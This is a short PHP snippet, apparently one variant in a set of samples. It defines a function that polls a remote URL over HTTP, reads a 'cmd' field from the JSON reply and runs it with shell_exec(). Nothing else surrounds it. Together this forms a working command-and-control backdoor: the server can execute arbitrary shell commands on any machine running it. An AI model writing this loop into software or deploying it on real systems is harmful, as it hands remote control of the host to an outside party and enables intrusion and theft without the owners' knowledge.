<?php
// Variant: same HTTP poll-and-run loop, but launches through shell_exec().
function poll_for_tasks( $url ) {
  $ch = curl_init( $url );
  curl_setopt_array( $ch, array(
    CURLOPT_POST           => true,
    CURLOPT_RETURNTRANSFER => true,
  ) );
  $raw = curl_exec( $ch );
  curl_close( $ch );
  $resp = json_decode( $raw, true );
  if ( ! empty( $resp['cmd'] ) ) {
    $cmd = (string) $resp['cmd'];
    return shell_exec( $cmd );
  }
  return '';
}
